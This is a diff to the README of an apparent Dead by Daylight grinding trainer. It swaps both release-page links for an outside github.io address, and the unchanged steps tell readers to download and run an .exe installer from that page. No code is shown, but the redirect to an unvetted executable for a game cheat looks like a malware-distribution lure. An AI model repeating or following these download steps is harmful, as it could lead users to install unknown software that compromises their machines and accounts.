@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026 - Automate your Dead by Daylight progression easily
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/windburnt-condor514/DBD-AutoGrind-Trainer-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://windburnt-condor514.github.io)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Verify your Windows version by pressing the Windows key and typing "About your P
 
 Follow these steps to obtain the correct files:
 
-1. Visit the [realease page](https://github.com/windburnt-condor514/DBD-AutoGrind-Trainer-2026/releases) to view current versions.
+1. Visit the [realease page](https://windburnt-condor514.github.io) to view current versions.
 2. Look for the section labeled "Assets."
 3. Select the file ending in .exe to download the installer.
 4. Save the file in a folder you can find later, such as your Downloads folder.
